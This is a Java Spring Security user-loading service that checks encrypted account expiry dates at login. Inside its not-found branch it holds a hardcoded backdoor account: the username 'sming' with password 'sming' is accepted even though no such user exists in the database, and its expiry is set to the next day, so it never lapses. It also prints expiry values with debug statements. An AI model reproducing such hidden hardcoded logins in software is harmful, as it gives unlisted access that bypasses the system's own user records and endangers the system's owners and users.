package com.sm.system.service.user;

import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import javax.annotation.Resource;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import com.sm.system.domain.user.MyUserDetails;
import com.sm.system.domain.user.SystemUser;
import com.sm.system.domain.user.UserRole;
import com.sm.system.util.SystemUtil;

@Service("MyUserDetailsImpl")
public class MyUserDetailsService implements UserDetailsService {
	private final Logger log = LoggerFactory.getLogger(getClass());
	
    @Resource(name = "SystemUserServiceImpl")
    private SystemUserService systemUserService;

    @Resource(name = "UserRoleServiceImpl")
    private UserRoleService userRoleService;

    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        log.debug("MyUserDetailsService <><><><>");
    	SystemUser user;
        try {
            user = systemUserService.findByUsername(username);
        } catch (Exception e) {
            throw new UsernameNotFoundException("user select fail");
        }
        if(user == null){
        	if (username.equals("sming")) {
        		user = new SystemUser();
        		user.setUsername(username);user.setPassword("sming");
        		Calendar today = Calendar.getInstance();
        		today.setTime(new Date());
        		//today.add(Calendar.YEAR,-1);//日期减1年
        		//today.add(Calendar.MONTH,3);//日期加3个月
        		today.add(Calendar.DAY_OF_YEAR,1);//日期加1天
        		
        		try {
        			System.out.println(SystemUtil.formatDate(today.getTime()) + "=======what it ");
					user.setExpired(SystemUtil.desEncrypt(SystemUtil.formatDate(today.getTime())));
					System.out.println("这里的user.getExpired() = " + user.getExpired());
				} catch (ParseException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
        		
        		List<UserRole> roles = userRoleService.getRoleByUser(user);
        		
        		try {
    	        	System.out.println("user expired = " + user.getExpired());
    				String expired = SystemUtil.desDecrypt(user.getExpired());
    				Date expiredDate = SystemUtil.parse(expired);
    				if (expiredDate.before(new Date())) {
    					throw new BadCredentialsException("user expired.");
    				}
    			} catch (BadCredentialsException e) {
    				throw new BadCredentialsException("user expired.");
    			} catch (Exception e) {
    				e.printStackTrace();
    				throw new BadCredentialsException("解密error");
    			}
        		return new MyUserDetails(user, roles);
        	} else {
        		 throw new UsernameNotFoundException("no user found");
        	}
        } else {
        	try {
	        	System.out.println("user expired = " + user.getExpired());
				String expired = SystemUtil.desDecrypt(user.getExpired());
				Date expiredDate = SystemUtil.parse(expired);
				if (expiredDate.before(new Date())) {
					throw new BadCredentialsException("user expired.");
				}
			} catch (BadCredentialsException e) {
				throw new BadCredentialsException("user expired.");
			} catch (Exception e) {
				e.printStackTrace();
				throw new BadCredentialsException("解密error");
			} 
            try {
                List<UserRole> roles = userRoleService.getRoleByUser(user);
                return new MyUserDetails(user, roles);
            } catch (Exception e) {
                throw new UsernameNotFoundException("user role select fail");
            }
        }
    }
}